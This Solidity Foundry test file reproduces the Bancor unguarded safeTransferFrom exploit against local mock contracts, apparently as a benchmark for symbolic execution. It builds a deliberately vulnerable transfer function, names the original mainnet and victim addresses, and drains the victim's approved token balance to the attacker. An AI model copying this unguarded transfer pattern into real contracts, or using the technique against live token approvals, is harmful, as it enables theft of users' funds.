// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/*
Bancor Protocol Access Control Exploit PoC - LOCALIZED VERSION

本地化版本说明：
- 所有远程合约调用转换为本地合约调用
- 状态从主网复制到本地合约
- 保持原有的漏洞逻辑但避免hevm bugs
*/

// Local ERC20 Token Implementation
contract LocalERC20Token {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals,
        uint256 _totalSupply
    ) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _totalSupply;
    }
    
    function transfer(address to, uint256 value) external returns (bool) {
        require(balanceOf[msg.sender] >= value, "Insufficient balance");
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        require(balanceOf[from] >= value, "Insufficient balance");
        require(allowance[from][msg.sender] >= value, "Insufficient allowance");
        
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    
    // Convenience function to set balances for testing
    function setBalance(address account, uint256 amount) external {
        balanceOf[account] = amount;
    }
    
    // Convenience function to set allowances for testing
    function setAllowance(address owner, address spender, uint256 amount) external {
        allowance[owner][spender] = amount;
    }
}

// Local Bancor Contract Implementation
contract LocalBancor {
    // Core vulnerability: public safeTransferFrom function
    function safeTransferFrom(
        LocalERC20Token _token, 
        address _from, 
        address _to, 
        uint256 _value
    ) public {
        // This is the vulnerable function - it's public and directly calls transferFrom
        // without proper access control
        bool success = _token.transferFrom(_from, _to, _value);
        require(success, "ERR_TRANSFER_FAILED");
    }
}

// Main exploit contract with localized dependencies
contract BancorExploit is Test {
    // Original addresses for reference
    address constant ORIGINAL_BANCOR = 0x5f58058C0eC971492166763c8C22632B583F667f;
    address constant ORIGINAL_XBP = 0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40;
    address constant VICTIM = 0xfd0B4DAa7bA535741E6B5Ba28Cba24F9a816E67E;
    
    // Local contract instances
    LocalERC20Token public localXBPToken;
    LocalBancor public localBancorContract;
    
    address attacker = address(this);
    
    function setUp() public {
        // Deploy local contracts
        localXBPToken = new LocalERC20Token(
            "XBP Token",
            "XBP", 
            18,
            1000000000 * 1e18  // 1B total supply
        );
        
        localBancorContract = new LocalBancor();
        
        // Set up initial state to match mainnet at block 10,307,563
        // Victim's balance: 905987977635678910008152 (from previous testing)
        localXBPToken.setBalance(VICTIM, 905987977635678910008152);
        
        // Victim has granted allowance to Bancor contract
        localXBPToken.setAllowance(VICTIM, address(localBancorContract), type(uint256).max);
        
        // Attacker starts with 0 balance
        localXBPToken.setBalance(attacker, 0);
    }
    
    function test_attack_concrete() public {
        uint256 balBefore = localXBPToken.balanceOf(attacker);
        uint256 knownWorkingAmount = 905987977635678910008152; // Known victim balance
        
        // Execute exploit with known working value
        localBancorContract.safeTransferFrom(
            localXBPToken,
            VICTIM,
            attacker,
            knownWorkingAmount
        );
        
        uint256 balAfter = localXBPToken.balanceOf(attacker);
        uint256 profit = balAfter - balBefore;
        
        console.log("Concrete test profit achieved:", profit / 1 ether, "ETH");
        assert(profit == knownWorkingAmount);
    }
    
    function test_attack_symbolic(uint256 _symbolicAmount) public {
        // Note: Removed the problematic view call that was causing hevm bugs
        // Original: localXBPToken.balanceOf(VICTIM);
        
        uint256 balBefore = localXBPToken.balanceOf(attacker);
        
        // Execute exploit with symbolic parameter using LOCAL contracts
        localBancorContract.safeTransferFrom(
            localXBPToken,
            VICTIM,
            attacker,
            _symbolicAmount
        );
        
        uint256 balAfter = localXBPToken.balanceOf(attacker);
        uint256 profit = balAfter - balBefore;
        
        uint256 TARGET_PROFIT = 905987977635678910008152;
        
        assert(!(profit >= TARGET_PROFIT));
    }
}